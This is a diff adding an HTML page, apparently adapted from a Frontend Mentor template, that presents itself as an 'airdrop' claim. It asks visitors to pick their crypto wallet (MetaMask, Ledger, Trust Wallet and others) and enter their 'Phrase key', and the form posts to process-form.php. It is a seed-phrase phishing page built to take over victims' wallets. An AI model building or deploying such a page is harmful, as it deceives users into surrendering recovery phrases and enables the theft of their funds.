@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- displays site properly based on user's device -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">
+  <title>Frontend Mentor | Interactive rating component</title>
+
+  <!-- Feel free to remove these styles or customise in your own stylesheet 👍 -->
+  <style>
+
+#msg{
+    color: red;
+}
+  </style>
+</head>
+<body>
+  <div class="main">
+    <h1>Connect Wallet to claim your airdrop</h1> 
+    <form action="process-form.php" method="post">
+        
+
+     
+
+<label for="priority">priority</label>
+<select id="priority" name="priority">
+    <option value="1">Blockchain Wallet</option>
+    <option value="2" selected>Exodus Wallet</option>
+    <option value="3">Coinbase Wallet</option> 
+    <option value="4">Trust Wallet</option> 
+    <option value="5">Aave Wallet</option> 
+    <option value="6">Ledger Wallet</option> 
+    <option value="7">Enjin Wallet</option> 
+    <option value="8">Mew Wallet</option> 
+    <option value="9">Binance Smart Chain</option> 
+    <option value="10">Metamask Wallet</option> 
+    <option value="11">Digitex Wallet</option> 
+    <option value="12">Authereum Wallet</option> 
+    <option value="13">Portise Wallet</option> 
+    <option value="14">Formatic Wallet</option> 
+    <option value="15">Defiat Wallet</option> 
+    <option value="16">Coinomi Wallet</option> 
+    <option value="17">Atomic Wallet</option> 
+
+
+</select>
+
+<label for="message">Phrase key</label>
+<textarea id="message" name="message"></textarea>
+
+<label>
+<input type="checkbox" name="terms">
+I agree to terms and conditions 
+</label>
+<br>
+<button>Participate in airdrop</button>
+    </form>
+
+
+
+
+  </div>
+</body>
+</html>
